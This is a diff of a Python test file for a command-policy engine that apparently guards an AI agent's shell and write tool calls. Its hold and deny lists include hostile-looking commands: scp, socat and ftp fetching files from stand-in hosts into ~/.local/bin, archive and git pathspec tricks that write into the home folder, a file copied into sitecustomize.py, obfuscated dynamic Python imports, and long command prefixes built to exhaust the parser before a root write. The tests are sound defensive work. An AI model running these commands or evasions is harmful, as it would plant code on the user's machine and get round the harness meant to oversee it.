@@ -4632,7 +4632,7 @@ class CodingPack(unittest.TestCase):
             "cp /tmp/evil ~/Documents/cl?ne/Hooks/x.sh",
             "cp -rt /tmp/d /usr/local/bin/tracekit /tmp/other && /tmp/other approve apr-1",
             "find . -name '*.pyc' -delete", "find ~/.local/bin -name '*.log' -delete",
-            "find ~ -name '*.pyc' -delete", "find ~/.local/bin -name other -delete", "chmod 755 ~/.local/bin/mytool", "chmod 755 ~/.local/bin", "chmod 700 ~/.local", "chmod +x ~/.local/bin/*", "chmod -R u+rwX,go-w ~/.local/share/uv", "chown -R $(whoami) ~/.local", "chgrp staff ~/.local/bin", "find ~/.local/bin -type l -xtype l -delete", "rm -rf ~/.cache/*", "rm -rf ~/Li*",
+            "find ~ -name '*.pyc' -delete", "find ~/.local/bin -name other -delete", "chmod 755 ~/.local/bin/mytool", "chmod 755 ~/.local/bin", "chmod 700 ~/.local", "chmod +x ~/.local/bin/*", "chmod -R u+rwX,go-w ~/.local/share/uv", "chown -R $(whoami) ~/.local", "chgrp staff ~/.local/bin", "find ~/.local/bin -type l -xtype l -delete", "rm -rf ~/.cache/*",
             "cp x vendor/uv/python/f", "rm -rf ~/.local/sh*/Trash", "cp x src/*/plugins/y", "cp x ~/*/hooks.json",
             "shopt -s nocaseglob; cp x src/PLUG?NS/y")]
         denied.append(("Write", {"path": "/home/u/.local/share/uv/python/cpython-3.12/bin/python3.12"}, "TK-D013"))
@@ -4810,6 +4810,10 @@ class CodingPack(unittest.TestCase):
             "git --git-dir=/tmp/e/.git --work-tree=$HOME/.local/share/uv/tools checkout -f .",
             "git --git-dir=/tmp/e/.git --work-tree=$HOME checkout -f .local", f"git -C {root} apply /tmp/p.diff",
             "cd ~/.local && tar -xf e.tar bin", "cd ~ && tar -xf e.tar .local", "tar -xf e.tar -C ~ .local/bin",
+            # unread content written into a home or a folder above one may be a root, the client record or a harness's settings
+            "tar -xf /tmp/e.tar -C ~ --exclude foo", "cd /tmp/evil && find . | cpio -pdmu ~", "tar -C ~ -xf x.tar",
+            "git --git-dir=/tmp/e/.git --work-tree=$HOME checkout -f .", "cd ~ && tar -xzf ~/Downloads/release.tgz",
+            "cd ~ && unzip ~/Downloads/x.zip", "tar -xf /tmp/e.tar -C /", "tar -xf /tmp/e.tar -C /Users", "tar -xf /tmp/e.tar -C ~/..",
             f"git -C {root} stash pop", f"cd {root} && git pull", f"patch -d {root} -p1 < /tmp/p.diff",
             f"cd {root} && patch -p1 < /tmp/p.diff", f"cp -RT /tmp/evil {root}",
             f"unar -o {root} e.rar", f"cabextract -d {root} e.cab", f"unrar x e.rar {root}/", f"cd {root} && jar xf e.jar",
@@ -4827,12 +4831,11 @@ class CodingPack(unittest.TestCase):
             ("Bash", {"command": "tar -xf /tmp/e.tar", "workdir": "/Users/me/.local/share/uv/tools"}, "TK-F015"),
             ("Bash", {"command": "tar -xf /tmp/e.tar", "dir_path": "/Users/me/.local/share/uv/tools"}, "TK-F015")]
         benign = [("Bash", {"command": c}) for c in (
-            # a bare home as a tree writer's target is no write to a root: what is written there is named, or isn't known
-            "tar -xf /tmp/e.tar -C ~ --exclude foo", "cd /tmp/evil && find . | cpio -pdmu ~", "cd ~ && git pull", "cd ~ && git stash pop",
-            "git --git-dir=/tmp/e/.git --work-tree=$HOME checkout -f .", "cd ~ && git checkout main", "cd ~ && git init myproj",
+            # git in a home writes what its repository has: only content that isn't its own, or a path it names, holds a root
+            "cd ~ && git pull", "cd ~ && git stash pop", "cd ~ && git checkout main", "cd ~ && git init myproj",
             "cd ~ && git clone https://github.com/org/repo.git", "git -C ~ clone https://github.com/org/repo.git proj",
-            "cd ~ && git worktree add ../wt", "cd ~ && tar -xzf ~/Downloads/release.tgz", "cd ~ && unzip ~/Downloads/x.zip",
-            "tar -C ~ -xf x.tar", "uv tool upgrade --all", "pipx upgrade-all",
+            "cd ~ && git worktree add ../wt", "cd ~/Documents && git clone https://github.com/org/repo.git",
+            "uv tool upgrade --all", "pipx upgrade-all",
             "tar -xf x.tar -C build", "tar -xzf x.tgz", "tar -xOf x.tar file | head", "tar -xOf x.tar -C ~/.local/share/uv/tools --exclude foo | head", "tar -xf x.tar -C ~/project src", "tar -cf x.tar src", "tar -tf x.tar",
             "patch -p1 < x.diff", "git -C repo pull", "git pull", "cd repo && git checkout main", "make -C build", "cargo build",
             'export PATH="$HOME/.local/bin:$PATH"', "mkdir -p ~/.local/bin", "ls ~/.local/share/uv/tools", "cat ~/.local/bin/tracekit",
@@ -4959,16 +4962,36 @@ class CodingPack(unittest.TestCase):
                     self.assertFalse({"TK-F009", "TK-F015", "TK-D007", "TK-D013", "TK-A054"}
                                      & set(e.decide(tool, args)["rule_ids"]))
 
-    def test_plugin_review_8_a_bare_home_is_no_root_write_but_what_a_tree_writer_names_in_it_is(self):
+    def test_plugin_review_9_unread_content_in_a_home_is_held_and_git_keeps_what_its_repository_has(self):
+        """The ninth review: an archive extracted into a bare home (or a folder above one) may plant a trust root, the client
+        record or a harness's settings; a pull, a checkout of a branch, a clone into a new folder write only what the
+        repository has. Foreign content (another repository, a patch, a whole-tree or magic pathspec) and what a command
+        names (`.local`, macOS's Library) are held."""
         for pack, engine, e in self.every_pack():
-            for cmd in ("cd ~ && git pull", "cd ~ && tar -xzf ~/Downloads/release.tgz", "cd ~ && unzip x.zip",
-                        "git -C ~ clone https://github.com/org/repo.git proj", "cd ~ && git worktree add ../wt",
-                        "cd ~ && git init myproj", "cd ~ && git stash pop", "uv tool upgrade --all", "pipx upgrade-all",
-                        "rclone copy remote:x ~", "xar -x -f a.xar -C ~", "aunpack -X ~ a.zip"):
+            for cmd in ("cd ~ && git pull", "cd ~ && git fetch", "cd ~ && git merge origin/main", "cd ~ && git rebase origin/main",
+                        "cd ~ && git checkout main", "cd ~ && git stash pop", "cd ~ && git init myproj", "cd ~ && git worktree add ../wt",
+                        "git -C ~ clone https://github.com/org/repo.git proj", "cd ~ && git clone https://github.com/org/repo.git",
+                        "cd ~/Documents && git clone https://github.com/org/repo.git", "uv tool upgrade --all", "pipx upgrade-all",
+                        "uv tool upgrade --all --quiet", "pipx upgrade-all --include-injected", "rclone copy remote:x ~",
+                        "xar -x -f a.xar -C ~", "tar -tzf x.tgz -C ~", "cd ~ && tar -czf backup.tgz projects"):
                 with self.subTest(pack=pack, engine=engine, cmd=cmd):
                     self.assertFalse({"TK-F015", "TK-D007"} & set(e.decide("Bash", {"command": cmd})["rule_ids"]))
-            for cmd in ("cd ~ && git checkout -f .local", "git -C ~ checkout .local", "cd ~ && tar -xzf r.tgz .local",
-                        "tar -xzf r.tgz -C ~ .local/share/uv", "xar -x -f a.xar -C ~/.local", "rclone copy remote:x ~/.local/bin"):
+            for cmd in ("tar -xzf e.tgz -C ~", "cd ~ && unzip -o x.zip", "cd ~ && 7z x e.7z", "tar -xf e.tar -C /", "tar -xf e.tar -C /Users",
+                        "cd ~ && patch -p1 < e.diff", "cd ~ && git apply e.diff", "cd ~ && git am e.mbox", "cp -R src/. ~", "cp -RT src ~",
+                        "ditto src ~", "rsync -a src/ ~/", "cd src && find . | cpio -pdm ~", "cd ~ && git pull /tmp/e.git", "cd ~ && git clone --separate-git-dir=/tmp/g u .",
+                        "git --git-dir=/tmp/e/.git --work-tree=$HOME checkout -f", "cd ~ && GIT_DIR=/tmp/e/.git git checkout -f .",
+                        "GIT_DIR=/tmp/e/.git GIT_WORK_TREE=~ git checkout -f .", "cd ~ && git -c core.worktree=/Users/me checkout -f evil",
+                        "cd ~ && git read-tree -u -m HEAD", "cd ~ && git checkout-index -a -f", "cd ~ && git checkout evil --pathspec-from-file=l",
+                        "cd ~ && git checkout evil -- .", "cd ~ && git checkout evil -- ':/'", "cd ~ && git checkout evil -- '*'",
+                        "cd ~ && git checkout evil -- ':(top).local'", "cd ~ && git checkout evil -- ':!README'", "cd ~ && git checkout evil -- ':^README'",
+                        "cd ~ && git checkout evil -- ':(literal).local'", "cd ~ && git checkout evil -- ':(icase).LOCAL'",
+                        "cd ~ && git checkout evil -- .local", "cd ~ && git checkout evil -- Library", "tar -C ~ -xf e.tar Library",
+                        "tar -xf e.tar -C ~ --wildcards 'Lib*'", "tar -xf e.tar -C ~ --transform 's,a,.local,' a", "bsdtar -xf e.tar -s ',a,.local,' -C ~ a",
+                        "tar -xf e.tar -C ~ .local/", "tar -xf e.tar -C ~ --include '.local/*'", "unzip e.zip '.local/*' -d ~", "7z x e.7z -o$HOME",
+                        "cd ~ && pax -r < e.tar", "cd ~ && jar xf e.jar", "cd ~ && unar e.zip", "tar -xf e.tar -C ~/Library",
+                        "xar -x -f a.xar -C ~/.local", "rclone copy remote:x ~/.local/bin", "UV_PYTHON=/tmp/p uv tool upgrade --all",
+                        "UV_CONFIG_FILE=/tmp/u.toml uv tool upgrade --all", "PIP_CONFIG_FILE=/tmp/p.conf pipx upgrade-all",
+                        "cd /tmp/proj && uv tool upgrade --all", "uv tool upgrade --all --index-url http://x/", "uv --config-file /tmp/u.toml tool upgrade --all"):
                 with self.subTest(pack=pack, engine=engine, cmd=cmd):
                     self.assertIn("TK-F015", e.decide("Bash", {"command": cmd})["rule_ids"])
 
@@ -4994,16 +5017,79 @@ class CodingPack(unittest.TestCase):
                         self.assertIn("TK-D007", d["rule_ids"])
 
     def test_plugin_review_8_ordinary_coding_commands_hold_nothing_about_a_trust_root(self):
-        """142 ordinary commands (git in a home, tar and unzip there, installs and upgrades, builds, listings): none is held
-        or denied for a trust root, the hook's files or a package source on any pack."""
+        """Ordinary commands (git in a home, archives in a project, installs and upgrades, builds, listings, reads of a root's
+        files): none is held or denied for a trust root, the hook's files or a package source on any pack, but those the file
+        gives an expected rule id after a tab (`uv tool install --force ruff` replaces a command in ~/.local/bin; a
+        `make test PYTHON=<the venv's python>` names the venv)."""
         with open(os.path.join(os.path.dirname(__file__), "data", "policy", "ordinary_commands.txt"), encoding="utf-8") as f:
-            commands = [line for line in f.read().split("\n") if line]
-        self.assertGreater(len(commands), 140)
+            rows = [line.split("\t") for line in f.read().split("\n") if line]
+        self.assertGreater(len(rows), 180)
         for pack, engine, e in self.every_pack():
-            for cmd in commands:
+            for cmd, *expected in rows:
                 with self.subTest(pack=pack, engine=engine, cmd=cmd):
-                    self.assertFalse({"TK-F015", "TK-D007", "TK-D013", "TK-A054", "TK-F009"}
-                                     & set(e.decide("Bash", {"command": cmd})["rule_ids"]))
+                    ids = set(e.decide("Bash", {"command": cmd})["rule_ids"])
+                    if expected:
+                        self.assertIn(expected[0], ids)
+                    else:
+                        self.assertFalse({"TK-F015", "TK-D007", "TK-D013", "TK-A054", "TK-F009"} & ids)
+
+    def test_plugin_review_9_more_output_writers_install_locations_and_the_recorders_dynamic_forms(self):
+        root = "~/.local/share/uv/tools/tracekit-ai"
+        bin_ = "~/.local/bin/tracekit"
+        pth = f"{root}/lib/python3.12/site-packages/x.pth"
+        held = [("Bash", {"command": c}, "TK-F015") for c in (
+            f"tar -cf {bin_} /tmp/e", f"tar -czf {pth} /tmp/e", f"zip {pth} /tmp/e", f"7z a {bin_} /tmp/e", f"pax -w -f {bin_} /tmp/e",
+            f"jar cf {bin_} /tmp/e", f"ar rc {bin_} /tmp/e.o", f"vim -es -c 'w! {bin_}' -c 'q!' /tmp/e", f"ex -sc 'w! {bin_}|q' /tmp/e",
+            f"nvim --headless -c 'saveas {bin_}' -c q /tmp/e", f"emacs --batch /tmp/e --eval '(write-file \"{bin_}\")'",
+            f"sqlite3 /tmp/db '.trace {bin_}' 'select 1'", f"sqlite3 /tmp/db '.log {bin_}'", f"sqlite3 /tmp/d \"attach '{pth}' as a; create table a.t(x)\"",
+            f"sed -n 'W {bin_}' /tmp/e", f"git -C /tmp/e archive -o {pth} HEAD", f"git -c x.y=z archive -o {bin_} HEAD",
+            f"git --git-dir /tmp/e/.git archive -o {bin_} HEAD", f"git --no-pager log --output={pth}", f"git blame --output {bin_} x",
+            f"git -C /tmp bundle create {bin_} HEAD", f"clang -o{bin_} x.c", f"gcc x.c -o{bin_}", f"pandoc x.md -o{pth}", f"make -C{root} install",
+            f"scp host:evil {bin_}", f"socat -u TCP:host:1 CREATE:{bin_}", f"ftp -o {bin_} http://example.invalid/x",
+            f"docker run --rm -v {root}:/m alpine cp /x /m/a", "podman run --rm -v ~/.local/bin:/m alpine cp /x /m/tracekit",
+            f"tree -fo {bin_}", "TMPDIR=~/.local/bin mktemp tracekit.XXXX", "mktemp -p~/.local/bin", f"uv init {root}",
+            f"make test PYTHON={root}/bin/python", f"PYTHON={root}/bin/python make test", f"cmake --install build --prefix {root}",
+            "./configure --prefix=$HOME/.local/share/uv/tools/tracekit-ai", f"meson setup build --prefix {root}",
+            "uv --config-file /tmp/u.toml tool upgrade --all", "UV_PYTHON=/tmp/p uv tool upgrade --all", "cd /tmp/proj && uv tool upgrade --all")]
+        denied = [("Bash", {"command": c}, "TK-D007") for c in (
+            "python3 -c \"import importlib as l; m=l.import_module('.install', package='tracekit')\"",
+            "python3 -c \"import pkgutil, tracekit; [print(n) for _, n, _ in pkgutil.walk_packages(tracekit.__path__, 'tracekit.')]\"",
+            "python3 -c \"import runpy; runpy.run_module('tracekit', run_name='__main__')\"",
+            "python3 -c \"import importlib; m = importlib.import_module('tracekit.' + 'install'); getattr(m, 'record_hook_' + 'python')()\"")]
+        benign = [("Bash", {"command": c}) for c in (
+            "make install PREFIX=~/.local", "cmake --install build --prefix ~/.local", "./configure --prefix=$HOME/.local",
+            "meson setup build --prefix ~/.local", "awk '/x/' ~/.local/bin/tracekit", "grep x ~/.local/bin/tracekit", "tar -cf /tmp/x.tar src",
+            "zip /tmp/x.zip src", "7z a /tmp/x.7z src", "vim -es -c 'w! /tmp/x' -c 'q!' f", "sqlite3 db '.trace /tmp/t'", "git archive -o /tmp/x.tgz HEAD",
+            "clang -o /tmp/x x.c", "gcc x.c -o/tmp/x", "scp host:x /tmp/x", "docker run --rm -v /tmp/d:/m alpine cp /x /m/a", "tree -fo /tmp/t",
+            "TMPDIR=/tmp/t mktemp x.XXXX", "uv init myproj", "make test PYTHON=python3", "uv tool upgrade --all --no-progress",
+            "python3 -c \"import importlib; print(importlib.import_module('json').dumps({}))\"", "python3 -c \"import tracekit; print(tracekit.__version__)\"")]
+        for pack, engine, e in self.every_pack():
+            for tool, args, rid in denied + held:
+                with self.subTest(pack=pack, engine=engine, tool=tool, args=args):
+                    ids = e.decide(tool, args)["rule_ids"]
+                    self.assertIn(rid, ids)
+            for tool, args in benign:
+                with self.subTest(pack=pack, engine=engine, tool=tool, args=args):
+                    self.assertFalse({"TK-F015", "TK-D007", "TK-D013", "TK-A054"} & set(e.decide(tool, args)["rule_ids"]))
+
+    def test_plugin_review_9_a_deny_survives_a_spender_whatever_follows_it(self):
+        """After a command that spends the work budget a root write still gets its deny: with a flag the command's own words
+        read (`cp -vt`, `install -Dt`, `--target=`, `ln -sft`, `-t~/x`), after a `cd`, and a delete after a cd."""
+        k = 200
+        pairs = "cp " + " ".join(f"-t d{i:04d}" for i in range(k)) + " " + " ".join(f"n{i:04d}" for i in range(k))
+        cds = "cd /a && " + " ".join(f"cd d{i};" for i in range(80))
+        tails = ("cp -vt ~/.local/bin tracekit", "install -Dt ~/.local/bin tracekit", "cp --target=~/.local/bin tracekit",
+                 "cp --target-dir ~/.local/bin tracekit", "ln -sft ~/.local/bin /tmp/e/tracekit", "cp -t~/.local/bin tracekit",
+                 "mv -t ~/.local/bin tracekit", "cd ~/.local/bin && cp /tmp/e tracekit", "cd ~/.local && rm -rf share",
+                 "echo x > ~/.local/bin/tracekit", "cd ~/.local/share/uv/tools/tracekit-ai/lib/python3.12/site-packages && cp /tmp/e sitecustomize.py")
+        for pack, engine, e in self.every_pack():
+            if pack not in ("coding.yaml", "dev.yaml", "server.yaml"):
+                continue
+            for spender in (pairs, cds):
+                for tail in tails:
+                    with self.subTest(pack=pack, engine=engine, spender=spender[:12], tail=tail):
+                        d = e.decide("Bash", {"command": spender + ("" if spender.endswith(";") else ";") + f" {tail}"})
+                        self.assertEqual(d["verdict"], "deny", d)
 
     @pytest.mark.serial
     def test_plugin_review_7_the_quadratic_shapes_are_read_in_bounded_time(self):
